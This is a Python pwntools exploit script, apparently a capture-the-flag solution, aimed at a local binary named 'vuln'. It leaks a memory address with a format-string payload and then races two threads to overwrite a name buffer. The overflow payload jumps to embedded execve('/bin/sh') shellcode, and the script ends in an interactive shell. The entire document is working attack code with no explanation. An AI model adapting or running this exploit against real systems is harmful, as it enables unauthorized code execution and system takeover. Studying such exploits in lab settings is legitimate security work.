from pwn import *
import threading

success = False
shellcode = "\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05"
 
def make(conn, name):
    conn.sendlineafter("> ", "2")
    conn.recvuntil("name? ")
    conn.sendline(name)

def change(conn, name):
    conn.sendlineafter("> ", "3")
    conn.sendlineafter("(yes/no):", "yes")
    conn.recvuntil("name? ")
    conn.sendline(name)

def display(conn):
    conn.sendlineafter("> ", "4")
 
def attack_vuln():
    while not success:
        conn = process("./vuln")
        for i in range(0, 300):
            make(conn, "a"*77)
        conn.close()

def writePayload(attack_addr):
    conn = process("./vuln")
    payload  = "D"*80
    payload += "A"*8
    payload += p64(attack_addr) # call shellocde
    payload += shellcode

    while not success:
        change(conn, payload)
    conn.close()


get_shell = process("./vuln")

# leak shared memory address
payload = "%lx "*16
make(get_shell, payload)
shared_addr = int("0x"+get_shell.recvline().split(" ")[4], 16)
log.info("shared_addr : " + hex(shared_addr))

shellcode_addr = shared_addr-0x60+0xc0

race1_make = threading.Thread(target=attack_vuln)
race2_payload = threading.Thread(target=writePayload, args=(shellcode_addr,))

race1_make.start()
race2_payload.start()

while True:
    display(get_shell)
    result = get_shell.recv(18, timeout=3)
    if not "[?] empty function" in result:
        get_shell.sendline("/bin/sh")
        break
success = True

get_shell.interactive()
